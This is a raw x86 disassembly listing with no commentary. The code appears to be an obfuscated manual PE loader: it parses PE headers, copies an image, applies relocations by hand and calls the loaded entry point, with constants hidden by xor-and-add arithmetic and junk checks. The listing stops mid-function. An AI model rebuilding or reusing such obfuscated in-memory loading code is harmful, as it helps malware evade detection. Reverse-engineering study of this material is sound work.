  41c02e:	mov    eax,DWORD PTR [ebp+0x8]
  41c031:	mov    eax,DWORD PTR [eax+0x1c0]
  41c037:	push   DWORD PTR [eax]
  41c039:	push   DWORD PTR [ebp-0x40]
  41c03c:	push   DWORD PTR [ebp-0x28]
  41c03f:	call   0x41cad6
  41c044:	mov    DWORD PTR [ebp-0x3c],eax
  41c047:	mov    eax,DWORD PTR [ebp-0x14]
  41c04a:	mov    ecx,DWORD PTR [ebp-0x28]
  41c04d:	xor    eax,ebx
  41c04f:	add    eax,esi
  41c051:	cmp    eax,ecx
  41c053:	je     0x41c074
  41c055:	mov    eax,DWORD PTR [ebp+0x8]
  41c058:	mov    ecx,DWORD PTR [ebp-0x50]
  41c05b:	mov    eax,DWORD PTR [eax+0x1d8]
  41c061:	xor    ecx,ebx
  41c063:	add    ecx,esi
  41c065:	push   ecx
  41c066:	mov    ecx,DWORD PTR [ebp-0x14]
  41c069:	xor    ecx,ebx
  41c06b:	add    ecx,esi
  41c06d:	push   ecx
  41c06e:	push   DWORD PTR [ebp-0x28]
  41c071:	call   DWORD PTR [eax+0x18]
  41c074:	pop    edi
  41c075:	pop    esi
  41c076:	pop    ebx
  41c077:	leave  
  41c078:	ret    0x4
  41c07b:	push   ebp
  41c07c:	mov    ebp,esp
  41c07e:	push   ecx
  41c07f:	push   ecx
  41c080:	lea    eax,[ebp-0x8]
  41c083:	mov    DWORD PTR [ebp-0x4],eax
  41c086:	push   esi
  41c087:	mov    esi,DWORD PTR [ebp-0x4]
  41c08a:	mov    eax,0xf881ba0f
  41c08f:	mov    DWORD PTR [esi],eax
  41c091:	mov    esi,DWORD PTR [ebp-0x8]
  41c094:	cmp    esi,eax
  41c096:	pop    esi
  41c097:	jne    0x41c0a1
  41c099:	mov    BYTE PTR [ecx+0xa],0x7a
  41c09d:	mov    BYTE PTR [edx+0x8],0x2f
  41c0a1:	mov    BYTE PTR [edx+0xa],0x7a
  41c0a5:	mov    BYTE PTR [ecx+0x2],0x4
  41c0a9:	leave  
  41c0aa:	ret    
  41c0ab:	push   ebp
  41c0ac:	mov    ebp,esp
  41c0ae:	push   ecx
  41c0af:	push   ecx
  41c0b0:	lea    eax,[ebp-0x8]
  41c0b3:	mov    DWORD PTR [ebp-0x4],eax
  41c0b6:	mov    edx,DWORD PTR [ebp-0x4]
  41c0b9:	mov    eax,0xf88b0be3
  41c0be:	mov    DWORD PTR [edx],eax
  41c0c0:	mov    edx,DWORD PTR [ebp-0x8]
  41c0c3:	cmp    edx,eax
  41c0c5:	jne    0x41c0d6
  41c0c7:	mov    eax,DWORD PTR [ebp+0x8]
  41c0ca:	mov    BYTE PTR [ecx+0x9],0xe
  41c0ce:	mov    BYTE PTR [eax+0x7],0x47
  41c0d2:	mov    BYTE PTR [ecx+0x6],0xf
  41c0d6:	mov    BYTE PTR [ecx+0x3],0x1e
  41c0da:	leave  
  41c0db:	ret    0x4
  41c0de:	push   ebp
  41c0df:	mov    ebp,esp
  41c0e1:	push   ecx
  41c0e2:	push   ecx
  41c0e3:	lea    eax,[ebp-0x8]
  41c0e6:	mov    DWORD PTR [ebp-0x4],eax
  41c0e9:	mov    edx,DWORD PTR [ebp-0x4]
  41c0ec:	mov    eax,0x7e0da0f
  41c0f1:	mov    DWORD PTR [edx],eax
  41c0f3:	mov    edx,DWORD PTR [ebp-0x8]
  41c0f6:	cmp    edx,eax
  41c0f8:	jne    0x41c0fe
  41c0fa:	mov    BYTE PTR [ecx+0x7],0x47
  41c0fe:	mov    eax,DWORD PTR [ebp+0x8]
  41c101:	mov    BYTE PTR [ecx+0x1],0x1
  41c105:	mov    BYTE PTR [eax+0x9],0x2e
  41c109:	leave  
  41c10a:	ret    0x4
  41c10d:	push   ebp
  41c10e:	mov    ebp,esp
  41c110:	push   ecx
  41c111:	push   ecx
  41c112:	lea    eax,[ebp-0x8]
  41c115:	mov    DWORD PTR [ebp-0x4],eax
  41c118:	push   esi
  41c119:	mov    esi,DWORD PTR [ebp-0x4]
  41c11c:	mov    eax,0x7060e3e
  41c121:	mov    DWORD PTR [esi],eax
  41c123:	mov    esi,DWORD PTR [ebp-0x8]
  41c126:	cmp    esi,eax
  41c128:	pop    esi
  41c129:	jne    0x41c135
  41c12b:	mov    BYTE PTR [edx+0x4],0xb
  41c12f:	mov    WORD PTR [ecx+0x3],0xb1e
  41c135:	mov    BYTE PTR [edx],0x3f
  41c138:	leave  
  41c139:	ret    
  41c13a:	push   ebp
  41c13b:	mov    ebp,esp
  41c13d:	push   ecx
  41c13e:	push   ecx
  41c13f:	lea    eax,[ebp-0x8]
  41c142:	mov    DWORD PTR [ebp-0x4],eax
  41c145:	mov    edx,DWORD PTR [ebp-0x4]
  41c148:	mov    eax,0xf8870b3f
  41c14d:	mov    DWORD PTR [edx],eax
  41c14f:	mov    edx,DWORD PTR [ebp-0x8]
  41c152:	cmp    edx,eax
  41c154:	jne    0x41c161
  41c156:	mov    eax,DWORD PTR [ebp+0x8]
  41c159:	mov    BYTE PTR [ecx+0x8],0xf
  41c15d:	mov    BYTE PTR [eax+0x1],0x1
  41c161:	mov    BYTE PTR [ecx+0x5],0xf3
  41c165:	leave  
  41c166:	ret    0x4
  41c169:	push   esi
  41c16a:	mov    ecx,edi
  41c16c:	call   0x41c13a
  41c171:	mov    edx,edi
  41c173:	mov    ecx,esi
  41c175:	mov    BYTE PTR [esi],0x1f
  41c178:	call   0x41c10d
  41c17d:	push   esi
  41c17e:	mov    ecx,edi
  41c180:	mov    BYTE PTR [esi+0x5],0xf3
  41c184:	call   0x41c0de
  41c189:	push   esi
  41c18a:	mov    BYTE PTR [esi+0x6],0xf
  41c18e:	call   0x41c0ab
  41c193:	mov    BYTE PTR [esi+0x2],0x4
  41c197:	mov    edx,esi
  41c199:	jmp    0x41c07b
  41c19e:	push   ebp
  41c19f:	mov    ebp,esp
  41c1a1:	push   ecx
  41c1a2:	mov    ecx,DWORD PTR [edx+0x194]
  41c1a8:	push   esi
  41c1a9:	mov    esi,DWORD PTR [ebp+0x8]
  41c1ac:	mov    esi,DWORD PTR [esi]
  41c1ae:	mov    DWORD PTR [ecx],esi
  41c1b0:	mov    ecx,DWORD PTR [edx+0x194]
  41c1b6:	mov    ecx,DWORD PTR [ecx]
  41c1b8:	mov    esi,DWORD PTR [edx+0x190]
  41c1be:	mov    DWORD PTR [esi],ecx
  41c1c0:	mov    eax,DWORD PTR [edx+0x194]
  41c1c6:	mov    ecx,DWORD PTR [eax]
  41c1c8:	mov    ecx,DWORD PTR [ecx+0x3c]
  41c1cb:	add    ecx,DWORD PTR [eax]
  41c1cd:	mov    DWORD PTR [ebp-0x4],0xf89ca5b9
  41c1d4:	mov    eax,DWORD PTR [ebp-0x4]
  41c1d7:	movzx  ecx,WORD PTR [ecx+0x16]
  41c1db:	xor    eax,0x7510899
  41c1e0:	add    eax,0x3272e0
  41c1e5:	pop    esi
  41c1e6:	test   ecx,eax
  41c1e8:	je     0x41c1f6
  41c1ea:	mov    eax,DWORD PTR [edx+0x1c8]
  41c1f0:	mov    DWORD PTR [eax],0xf89c85b8
  41c1f6:	leave  
  41c1f7:	ret    0x4
  41c1fa:	push   ebp
  41c1fb:	mov    ebp,esp
  41c1fd:	sub    esp,0x70
  41c200:	and    DWORD PTR [ebp-0x20],0x0
  41c204:	mov    DWORD PTR [ebp-0x18],0xf89cb5b9
  41c20b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f9
  41c212:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  41c219:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41c220:	mov    DWORD PTR [ebp-0x2c],0xf89f05b9
  41c227:	mov    eax,DWORD PTR [ebp+0x20]
  41c22a:	mov    eax,DWORD PTR [eax+0x194]
  41c230:	mov    DWORD PTR [ebp-0xc],eax
  41c233:	mov    eax,DWORD PTR [ebp+0x20]
  41c236:	push   ebx
  41c237:	push   esi
  41c238:	mov    esi,DWORD PTR [eax+0x190]
  41c23e:	mov    eax,DWORD PTR [ebp+0x20]
  41c241:	mov    eax,DWORD PTR [eax+0x18c]
  41c247:	mov    DWORD PTR [ebp-0x8],eax
  41c24a:	mov    eax,DWORD PTR [eax]
  41c24c:	push   edi
  41c24d:	mov    DWORD PTR [ebp-0x4],esi
  41c250:	test   eax,eax
  41c252:	jne    0x41c25f
  41c254:	push   DWORD PTR [ebp+0x1c]
  41c257:	mov    edx,DWORD PTR [ebp+0x20]
  41c25a:	call   0x41c19e
  41c25f:	mov    eax,DWORD PTR [esi]
  41c261:	mov    ebx,DWORD PTR [esi]
  41c263:	add    ebx,DWORD PTR [eax+0x3c]
  41c266:	mov    eax,DWORD PTR [ebp+0xc]
  41c269:	mov    ecx,DWORD PTR [ebp-0x8]
  41c26c:	mov    ecx,DWORD PTR [ecx]
  41c26e:	mov    esi,0x7510899
  41c273:	xor    eax,esi
  41c275:	mov    edi,0x3272e0
  41c27a:	add    eax,edi
  41c27c:	cmp    eax,ecx
  41c27e:	jne    0x41c4b6
  41c284:	mov    eax,DWORD PTR [ebp-0xc]
  41c287:	mov    eax,DWORD PTR [eax]
  41c289:	mov    DWORD PTR [ebp-0x10],eax
  41c28c:	mov    eax,DWORD PTR [ebx+0x50]
  41c28f:	mov    DWORD PTR [ebp-0x68],eax
  41c292:	mov    eax,DWORD PTR [ebp-0x18]
  41c295:	xor    eax,esi
  41c297:	add    eax,edi
  41c299:	mov    DWORD PTR [ebp-0x64],eax
  41c29c:	mov    eax,DWORD PTR [ebp-0x14]
  41c29f:	and    DWORD PTR [ebp-0x6c],0x0
  41c2a3:	xor    eax,esi
  41c2a5:	add    eax,edi
  41c2a7:	mov    DWORD PTR [ebp-0x60],eax
  41c2aa:	lea    eax,[ebp-0x70]
  41c2ad:	push   eax
  41c2ae:	mov    eax,DWORD PTR [ebp+0x8]
  41c2b1:	xor    eax,esi
  41c2b3:	add    eax,edi
  41c2b5:	push   eax
  41c2b6:	mov    eax,DWORD PTR [ebp+0x20]
  41c2b9:	add    eax,0xaa
  41c2be:	push   eax
  41c2bf:	mov    eax,DWORD PTR [ebp+0x20]
  41c2c2:	mov    eax,DWORD PTR [eax+0x198]
  41c2c8:	mov    DWORD PTR [ebp-0x70],0x4
  41c2cf:	push   DWORD PTR [eax]
  41c2d1:	mov    eax,DWORD PTR [ebp+0x10]
  41c2d4:	call   eax
  41c2d6:	mov    ecx,DWORD PTR [ebp-0xc]
  41c2d9:	mov    ecx,DWORD PTR [ecx]
  41c2db:	mov    edx,DWORD PTR [ebp-0x8]
  41c2de:	mov    DWORD PTR [ebp-0x6c],eax
  41c2e1:	mov    DWORD PTR [ebp+0x1c],eax
  41c2e4:	mov    DWORD PTR [edx],ecx
  41c2e6:	mov    ecx,DWORD PTR [ebp-0x4]
  41c2e9:	mov    DWORD PTR [ecx],eax
  41c2eb:	mov    eax,DWORD PTR [ebx+0x50]
  41c2ee:	mov    DWORD PTR [ebp-0x68],eax
  41c2f1:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2f4:	xor    eax,esi
  41c2f6:	add    eax,edi
  41c2f8:	mov    DWORD PTR [ebp-0x64],eax
  41c2fb:	lea    eax,[ebp-0x20]
  41c2fe:	mov    DWORD PTR [ebp-0x60],eax
  41c301:	lea    eax,[ebp-0x70]
  41c304:	push   eax
  41c305:	mov    eax,DWORD PTR [ebp+0x8]
  41c308:	xor    eax,esi
  41c30a:	add    eax,edi
  41c30c:	push   eax
  41c30d:	mov    eax,DWORD PTR [ebp+0x20]
  41c310:	add    eax,0xee
  41c315:	push   eax
  41c316:	mov    eax,DWORD PTR [ebp+0x20]
  41c319:	mov    eax,DWORD PTR [eax+0x198]
  41c31f:	mov    DWORD PTR [ebp-0x70],0x4
  41c326:	push   DWORD PTR [eax]
  41c328:	mov    eax,DWORD PTR [ebp+0x10]
  41c32b:	call   eax
  41c32d:	test   eax,eax
  41c32f:	je     0x41c354
  41c331:	and    DWORD PTR [ebp+0xc],0x0
  41c335:	cmp    DWORD PTR [ebx+0x50],0x0
  41c339:	jbe    0x41c354
  41c33b:	mov    eax,DWORD PTR [ebp+0x1c]
  41c33e:	mov    ecx,DWORD PTR [ebp-0x10]
  41c341:	sub    ecx,eax
  41c343:	mov    dl,BYTE PTR [ecx+eax*1]
  41c346:	inc    DWORD PTR [ebp+0xc]
  41c349:	mov    BYTE PTR [eax],dl
  41c34b:	mov    edx,DWORD PTR [ebp+0xc]
  41c34e:	inc    eax
  41c34f:	cmp    edx,DWORD PTR [ebx+0x50]
  41c352:	jb     0x41c343
  41c354:	mov    edx,DWORD PTR [ebp+0x1c]
  41c357:	mov    ecx,DWORD PTR [edx+0x3c]
  41c35a:	add    ecx,edx
  41c35c:	mov    eax,DWORD PTR [ecx+0xa0]
  41c362:	mov    ebx,DWORD PTR [ecx+0x28]
  41c365:	add    eax,edx
  41c367:	sub    edx,DWORD PTR [ebp-0x10]
  41c36a:	add    ebx,DWORD PTR [ebp+0x1c]
  41c36d:	mov    DWORD PTR [ebp+0xc],edx
  41c370:	mov    DWORD PTR [ebp-0x2c],ecx
  41c373:	mov    DWORD PTR [ebp-0x14],ebx
  41c376:	mov    DWORD PTR [ebp-0x8],0x0
  41c37d:	jmp    0x41c3f9
  41c37f:	add    edx,0xfffffff8
  41c382:	shr    edx,1
  41c384:	mov    DWORD PTR [ebp-0x18],edx
  41c387:	je     0x41c3e5
  41c389:	lea    edx,[eax+0x8]
  41c38c:	mov    DWORD PTR [ebp-0x4],edx
  41c38f:	mov    edx,DWORD PTR [ebp-0x18]
  41c392:	mov    DWORD PTR [ebp-0x18],edx
  41c395:	mov    edx,DWORD PTR [ebp-0x4]
  41c398:	movzx  edx,WORD PTR [edx]
  41c39b:	mov    DWORD PTR [ebp-0x24],edx
  41c39e:	and    edx,0xfff
  41c3a4:	mov    DWORD PTR [ebp-0x28],edx
  41c3a7:	mov    edx,DWORD PTR [ebp-0x24]
  41c3aa:	shr    edx,0xc
  41c3ad:	add    edx,0xffcd8d20
  41c3b3:	xor    edx,esi
  41c3b5:	cmp    edx,0xf89c85ba
  41c3bb:	jne    0x41c3dc
  41c3bd:	mov    edx,DWORD PTR [ebp-0x28]
  41c3c0:	add    edx,DWORD PTR [ebp+0x1c]
  41c3c3:	mov    ebx,DWORD PTR [eax]
  41c3c5:	cmp    DWORD PTR [ebx+edx*1],0x0
  41c3c9:	je     0x41c3d9
  41c3cb:	mov    ecx,DWORD PTR [ebp+0xc]
  41c3ce:	add    ecx,DWORD PTR [ebx+edx*1]
  41c3d1:	mov    ebx,DWORD PTR [eax]
  41c3d3:	mov    DWORD PTR [edx+ebx*1],ecx
  41c3d6:	mov    ecx,DWORD PTR [ebp-0x2c]
  41c3d9:	mov    ebx,DWORD PTR [ebp-0x14]
  41c3dc:	add    DWORD PTR [ebp-0x4],0x2
  41c3e0:	dec    DWORD PTR [ebp-0x18]
  41c3e3:	jne    0x41c395
  41c3e5:	mov    edx,DWORD PTR [ebp-0xc]
  41c3e8:	add    DWORD PTR [ebp-0x8],edx
  41c3eb:	mov    edx,DWORD PTR [ebp-0x8]
  41c3ee:	cmp    edx,DWORD PTR [ecx+0xa4]
  41c3f4:	jae    0x41c407
  41c3f6:	add    eax,DWORD PTR [ebp-0xc]
  41c3f9:	mov    edx,DWORD PTR [eax+0x4]
  41c3fc:	mov    DWORD PTR [ebp-0xc],edx
  41c3ff:	test   edx,edx
  41c401:	jne    0x41c37f
  41c407:	mov    eax,DWORD PTR [ebp-0x10]
  41c40a:	mov    DWORD PTR [ebp-0x6c],eax
  41c40d:	mov    DWORD PTR [ebp-0x70],0x4
  41c414:	mov    eax,DWORD PTR [ecx+0x50]
  41c417:	mov    DWORD PTR [ebp-0x68],eax
  41c41a:	mov    eax,DWORD PTR [ebp-0x1c]
  41c41d:	xor    eax,esi
  41c41f:	add    eax,edi
  41c421:	mov    DWORD PTR [ebp-0x64],eax
  41c424:	lea    eax,[ebp-0x20]
  41c427:	mov    DWORD PTR [ebp-0x60],eax
  41c42a:	lea    eax,[ebp-0x70]
  41c42d:	push   eax
  41c42e:	mov    eax,DWORD PTR [ebp+0x8]
  41c431:	xor    eax,esi
  41c433:	add    eax,edi
  41c435:	push   eax
  41c436:	mov    eax,DWORD PTR [ebp+0x20]
  41c439:	add    eax,0xee
  41c43e:	push   eax
  41c43f:	mov    eax,DWORD PTR [ebp+0x20]
  41c442:	mov    eax,DWORD PTR [eax+0x198]
  41c448:	push   DWORD PTR [eax]
  41c44a:	mov    eax,DWORD PTR [ebp+0x10]
  41c44d:	call   eax
  41c44f:	mov    eax,DWORD PTR [ebp+0x20]
  41c452:	mov    eax,DWORD PTR [eax+0x180]
  41c458:	add    eax,DWORD PTR [ebp+0xc]
  41c45b:	mov    ecx,DWORD PTR [ebp+0xc]
  41c45e:	push   DWORD PTR [ebp+0x18]
  41c461:	mov    DWORD PTR [eax],ecx
  41c463:	push   DWORD PTR [ebp+0x14]
  41c466:	push   DWORD PTR [ebp+0x1c]
  41c469:	call   ebx
  41c46b:	mov    ecx,DWORD PTR [ebp+0xc]
  41c46e:	add    ecx,DWORD PTR [ebp+0x20]
  41c471:	lea    eax,[ebp+0x4]
  41c474:	mov    DWORD PTR [ebp+0x20],ecx
  41c477:	mov    ecx,DWORD PTR [ebp+0x20]
  41c47a:	mov    ecx,DWORD PTR [ebp+0x20]
  41c47d:	mov    edx,DWORD PTR [ecx+0x190]
  41c483:	mov    ecx,DWORD PTR [ebp+0x20]
  41c486:	mov    ecx,DWORD PTR [ecx+0x18c]
  41c48c:	mov    esi,DWORD PTR [ecx]
  41c48e:	cmp    DWORD PTR [eax],esi
  41c490:	jb     0x41c4b1
  41c492:	mov    esi,DWORD PTR [edx]
  41c494:	mov    edi,DWORD PTR [edx]
  41c496:	mov    esi,DWORD PTR [esi+0x3c]
  41c499:	lea    esi,[edi+esi*1+0x50]
  41c49d:	mov    edi,DWORD PTR [ecx]
  41c49f:	add    edi,DWORD PTR [esi]
  41c4a1:	cmp    DWORD PTR [eax],edi
  41c4a3:	jae    0x41c4b1
  41c4a5:	mov    esi,DWORD PTR [ecx]
  41c4a7:	mov    ecx,DWORD PTR [eax]
  41c4a9:	mov    edx,DWORD PTR [edx]
  41c4ab:	sub    ecx,esi
  41c4ad:	add    edx,ecx
  41c4af:	mov    DWORD PTR [eax],edx
  41c4b1:	mov    eax,DWORD PTR [ebp+0xc]
  41c4b4:	jmp    0x41c4b8
  41c4b6:	xor    eax,eax
  41c4b8:	pop    edi
  41c4b9:	pop    esi
  41c4ba:	pop    ebx
  41c4bb:	leave  
  41c4bc:	ret    0x1c
  41c4bf:	push   ebp
  41c4c0:	mov    ebp,esp
  41c4c2:	sub    esp,0x1c
  41c4c5:	push   esi
  41c4c6:	mov    esi,eax
  41c4c8:	mov    eax,DWORD PTR [ecx+0x190]
  41c4ce:	cmp    DWORD PTR [eax],0x0
  41c4d1:	je     0x41c5e1
  41c4d7:	test   edx,edx
  41c4d9:	je     0x41c5e1
  41c4df:	test   esi,esi
  41c4e1:	je     0x41c5e1
  41c4e7:	mov    eax,DWORD PTR [esi+0x88]
  41c4ed:	test   eax,eax
  41c4ef:	je     0x41c5dc
  41c4f5:	cmp    DWORD PTR [esi+0x8c],0x10
  41c4fc:	je     0x41c5dc
  41c502:	cmp    DWORD PTR [esi+0x34],edx
  41c505:	je     0x41c5dc
  41c50b:	mov    esi,DWORD PTR [ecx+0x18c]
  41c511:	and    DWORD PTR [ebp-0x10],0x0
  41c515:	mov    ecx,edx
  41c517:	sub    ecx,DWORD PTR [esi]
  41c519:	add    eax,edx
  41c51b:	movzx  edx,WORD PTR [eax+0xc]
  41c51f:	mov    DWORD PTR [ebp-0x1c],ecx
  41c522:	movzx  ecx,WORD PTR [eax+0xe]
  41c526:	add    ecx,edx
  41c528:	je     0x41c5dc
  41c52e:	lea    ecx,[eax+0x14]
  41c531:	push   ebx
  41c532:	mov    DWORD PTR [ebp-0x18],ecx
  41c535:	mov    esi,0x7fffffff
  41c53a:	push   edi
  41c53b:	test   DWORD PTR [ecx],esi
  41c53d:	je     0x41c5be
  41c53f:	mov    edx,DWORD PTR [ecx]
  41c541:	and    DWORD PTR [ebp-0xc],0x0
  41c545:	and    edx,esi
  41c547:	add    edx,eax
  41c549:	movzx  edi,WORD PTR [edx+0xe]
  41c54d:	movzx  ebx,WORD PTR [edx+0xc]
  41c551:	add    edi,ebx
  41c553:	je     0x41c5be
  41c555:	lea    ecx,[edx+0x14]
  41c558:	mov    DWORD PTR [ebp-0x14],ecx
  41c55b:	test   DWORD PTR [ecx],esi
  41c55d:	je     0x41c5a0
  41c55f:	mov    ecx,DWORD PTR [ecx]
  41c561:	and    DWORD PTR [ebp-0x8],0x0
  41c565:	and    ecx,esi
  41c567:	add    ecx,eax
  41c569:	movzx  edi,WORD PTR [ecx+0xe]
  41c56d:	movzx  ebx,WORD PTR [ecx+0xc]
  41c571:	add    edi,ebx
  41c573:	je     0x41c5a0
  41c575:	lea    edi,[ecx+0x14]
  41c578:	mov    DWORD PTR [ebp-0x4],edi
  41c57b:	mov    edi,DWORD PTR [ebp-0x4]
  41c57e:	mov    edi,DWORD PTR [edi]
  41c580:	test   edi,edi
  41c582:	je     0x41c58a
  41c584:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c587:	add    DWORD PTR [edi+eax*1],ebx
  41c58a:	movzx  edi,WORD PTR [ecx+0xe]
  41c58e:	movzx  ebx,WORD PTR [ecx+0xc]
  41c592:	inc    DWORD PTR [ebp-0x8]
  41c595:	add    DWORD PTR [ebp-0x4],0x8
  41c599:	add    edi,ebx
  41c59b:	cmp    DWORD PTR [ebp-0x8],edi
  41c59e:	jb     0x41c57b
  41c5a0:	movzx  edi,WORD PTR [edx+0xe]
  41c5a4:	movzx  ebx,WORD PTR [edx+0xc]
  41c5a8:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ab:	inc    DWORD PTR [ebp-0xc]
  41c5ae:	add    ecx,0x8
  41c5b1:	add    edi,ebx
  41c5b3:	mov    DWORD PTR [ebp-0x14],ecx
  41c5b6:	cmp    DWORD PTR [ebp-0xc],edi
  41c5b9:	jb     0x41c55b
  41c5bb:	mov    ecx,DWORD PTR [ebp-0x18]
  41c5be:	movzx  edx,WORD PTR [eax+0xe]
  41c5c2:	movzx  edi,WORD PTR [eax+0xc]
  41c5c6:	inc    DWORD PTR [ebp-0x10]
  41c5c9:	add    ecx,0x8
  41c5cc:	add    edx,edi
  41c5ce:	mov    DWORD PTR [ebp-0x18],ecx
  41c5d1:	cmp    DWORD PTR [ebp-0x10],edx
  41c5d4:	jb     0x41c53b
  41c5da:	pop    edi
  41c5db:	pop    ebx
  41c5dc:	xor    eax,eax
  41c5de:	inc    eax
  41c5df:	jmp    0x41c5e3
  41c5e1:	xor    eax,eax
  41c5e3:	pop    esi
  41c5e4:	leave  
  41c5e5:	ret    
  41c5e6:	push   ebp
  41c5e7:	mov    ebp,esp
  41c5e9:	mov    ecx,DWORD PTR [ecx+0x190]
  41c5ef:	mov    eax,DWORD PTR [ebp+0xc]
  41c5f2:	sub    esp,0x10
  41c5f5:	push   ebx
  41c5f6:	xor    ebx,ebx
  41c5f8:	push   esi
  41c5f9:	push   edi
  41c5fa:	cmp    DWORD PTR [ecx],ebx
  41c5fc:	je     0x41c684
  41c602:	cmp    eax,ebx
  41c604:	je     0x41c684
  41c606:	cmp    DWORD PTR [eax+0x78],ebx
  41c609:	jne    0x41c610
  41c60b:	xor    eax,eax
  41c60d:	inc    eax
  41c60e:	jmp    0x41c686
  41c610:	mov    eax,DWORD PTR [eax+0x78]
  41c613:	add    eax,DWORD PTR [ebp+0x8]
  41c616:	mov    ecx,DWORD PTR [eax+0x1c]
  41c619:	mov    edx,DWORD PTR [eax+0x24]
  41c61c:	mov    esi,DWORD PTR [eax+0x14]
  41c61f:	mov    edi,DWORD PTR [eax+0x18]
  41c622:	add    ecx,DWORD PTR [ebp+0x8]
  41c625:	add    edx,DWORD PTR [ebp+0x8]
  41c628:	mov    DWORD PTR [ebp-0x4],esi
  41c62b:	cmp    esi,edi
  41c62d:	ja     0x41c632
  41c62f:	mov    DWORD PTR [ebp-0x4],edi
  41c632:	mov    DWORD PTR [ebp-0x8],ebx
  41c635:	cmp    DWORD PTR [ebp-0x4],ebx
  41c638:	jbe    0x41c60b
  41c63a:	cmp    ebx,DWORD PTR [eax+0x14]
  41c63d:	jae    0x41c645
  41c63f:	movzx  esi,WORD PTR [edx+ebx*2]
  41c643:	jmp    0x41c647
  41c645:	mov    esi,ebx
  41c647:	lea    esi,[ecx+esi*4]
  41c64a:	mov    edi,DWORD PTR [esi]
  41c64c:	test   edi,edi
  41c64e:	je     0x41c679
  41c650:	add    edi,DWORD PTR [ebp+0x8]
  41c653:	mov    DWORD PTR [ebp-0x10],edi
  41c656:	cmp    edi,eax
  41c658:	jbe    0x41c66a
  41c65a:	mov    ebx,DWORD PTR [ebp+0xc]
  41c65d:	mov    ebx,DWORD PTR [ebx+0x7c]
  41c660:	add    ebx,eax
  41c662:	cmp    edi,ebx
  41c664:	jae    0x41c66a
  41c666:	mov    esi,DWORD PTR [esi]
  41c668:	jmp    0x41c672
  41c66a:	sub    edi,DWORD PTR [ebp+0x8]
  41c66d:	mov    DWORD PTR [esi],edi
  41c66f:	mov    esi,DWORD PTR [ebp-0x10]
  41c672:	test   esi,esi
  41c674:	je     0x41c684
  41c676:	mov    ebx,DWORD PTR [ebp-0x8]
  41c679:	inc    ebx
  41c67a:	mov    DWORD PTR [ebp-0x8],ebx
  41c67d:	cmp    ebx,DWORD PTR [ebp-0x4]
  41c680:	jb     0x41c63a
  41c682:	jmp    0x41c60b
  41c684:	xor    eax,eax
  41c686:	pop    edi
  41c687:	pop    esi
  41c688:	pop    ebx
  41c689:	leave  
  41c68a:	ret    0x8
  41c68d:	push   ebp
  41c68e:	mov    ebp,esp
  41c690:	sub    esp,0x2c
  41c693:	mov    edx,0xf89c85b9
  41c698:	mov    DWORD PTR [ebp-0x4],edx
  41c69b:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41c6a2:	mov    eax,DWORD PTR [ebp-0x4]
  41c6a5:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6a8:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6ab:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6ae:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6b1:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6b4:	push   ebx
  41c6b5:	mov    ebx,DWORD PTR [ebp+0x10]
  41c6b8:	push   esi
  41c6b9:	mov    esi,0x7510899
  41c6be:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41c6c5:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6c8:	mov    ebx,DWORD PTR [ebx+0x190]
  41c6ce:	push   edi
  41c6cf:	mov    edi,0x3272e0
  41c6d4:	xor    ecx,esi
  41c6d6:	xor    eax,esi
  41c6d8:	add    eax,edi
  41c6da:	add    ecx,edi
  41c6dc:	mov    DWORD PTR [ebp-0x18],eax
  41c6df:	cmp    ecx,DWORD PTR [ebx]
  41c6e1:	je     0x41c962
  41c6e7:	mov    ebx,DWORD PTR [ebp-0x4]
  41c6ea:	mov    ecx,DWORD PTR [ebp+0xc]
  41c6ed:	xor    ebx,esi
  41c6ef:	add    ebx,edi
  41c6f1:	cmp    ebx,ecx
  41c6f3:	je     0x41c962
  41c6f9:	mov    ebx,DWORD PTR [ebp-0x4]
  41c6fc:	mov    ecx,DWORD PTR [ecx+0x80]
  41c702:	xor    ebx,esi
  41c704:	add    ebx,edi
  41c706:	cmp    ecx,ebx
  41c708:	je     0x41c95d
  41c70e:	add    ecx,DWORD PTR [ebp+0x8]
  41c711:	mov    DWORD PTR [ebp-0x2c],ecx
  41c714:	mov    ebx,edx
  41c716:	xor    ebx,esi
  41c718:	add    ebx,edi
  41c71a:	mov    DWORD PTR [ebp-0x10],ebx
  41c71d:	mov    ebx,DWORD PTR [ebp-0x10]
  41c720:	cmp    ebx,edx
  41c722:	je     0x41c736
  41c724:	mov    edx,DWORD PTR [ebp-0x10]
  41c727:	mov    ebx,DWORD PTR [ebp-0x4]
  41c72a:	imul   edx,edx,0x14
  41c72d:	xor    ebx,esi
  41c72f:	add    ebx,edi
  41c731:	cmp    DWORD PTR [edx+ecx*1],ebx
  41c734:	jne    0x41c74d
  41c736:	mov    edx,DWORD PTR [ebp-0x10]
  41c739:	mov    ebx,DWORD PTR [ebp-0x4]
  41c73c:	imul   edx,edx,0x14
  41c73f:	xor    ebx,esi
  41c741:	add    ebx,edi
  41c743:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41c747:	je     0x41c94f
  41c74d:	mov    eax,DWORD PTR [ebp-0x4]
  41c750:	mov    ebx,DWORD PTR [ebp-0x4]
  41c753:	mov    eax,DWORD PTR [ebp-0x10]
  41c756:	imul   eax,eax,0x14
  41c759:	add    eax,ecx
  41c75b:	mov    ecx,DWORD PTR [eax+0x10]
  41c75e:	add    ecx,DWORD PTR [ebp+0x8]
  41c761:	xor    ebx,esi
  41c763:	mov    DWORD PTR [ebp-0x1c],ecx
  41c766:	mov    ecx,DWORD PTR [ebp-0x4]
  41c769:	mov    edx,DWORD PTR [ebp-0x4]
  41c76c:	xor    ecx,esi
  41c76e:	add    ecx,edi
  41c770:	xor    edx,esi
  41c772:	mov    DWORD PTR [ebp-0x24],ecx
  41c775:	mov    ecx,DWORD PTR [eax]
  41c777:	add    edx,edi
  41c779:	add    ebx,edi
  41c77b:	cmp    ecx,edx
  41c77d:	je     0x41c785
  41c77f:	add    ecx,DWORD PTR [ebp+0x8]
